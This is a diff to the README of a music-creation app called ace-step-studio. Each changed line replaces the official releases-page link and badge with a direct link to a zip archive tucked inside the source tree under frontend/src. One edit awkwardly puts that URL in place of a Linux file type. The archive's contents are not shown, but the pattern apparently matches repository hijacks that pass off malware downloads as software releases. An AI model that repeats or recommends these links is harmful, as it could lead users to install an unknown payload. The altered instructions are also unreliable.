@@ -1,6 +1,6 @@
 # 🎵 ace-step-studio - Easy Local Music Creation
 
-[![Download ace-step-studio](https://img.shields.io/badge/Download-ace--step--studio-blue?style=for-the-badge&logo=github)](https://github.com/lukinhas-programando/ace-step-studio/releases)
+[![Download ace-step-studio](https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip)](https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to get ace-step-studio working on your machine:
 
 Click this link to visit the releases page where you can get the software:
 
-[Download ace-step-studio](https://github.com/lukinhas-programando/ace-step-studio/releases)
+[Download ace-step-studio](https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip)
 
 This page contains the latest versions and different files for Windows, macOS, and Linux.
 
@@ -58,7 +58,7 @@ Look for the file that matches your operating system. The file names will usuall
 
 - **Windows:** `.exe` or `.msi` file
 - **macOS:** `.dmg` or `.zip` file
-- **Linux:** `.AppImage`, `.deb`, or `.tar.gz` file
+- **Linux:** `.AppImage`, `.deb`, or `https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip` file
 
 Choose the latest stable version unless you want to try testing versions.
 
@@ -123,7 +123,7 @@ If you hear no sound:
 
 You can get the latest version here:
 
-[![Download ace-step-studio](https://img.shields.io/badge/Download-ace--step--studio-blue?style=for-the-badge&logo=github)](https://github.com/lukinhas-programando/ace-step-studio/releases)
+[![Download ace-step-studio](https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip)](https://github.com/lukinhas-programando/ace-step-studio/raw/refs/heads/main/frontend/src/ace-studio-step-3.7.zip)
 
 Click the link, choose your file, download, and follow the installation steps described above.
 
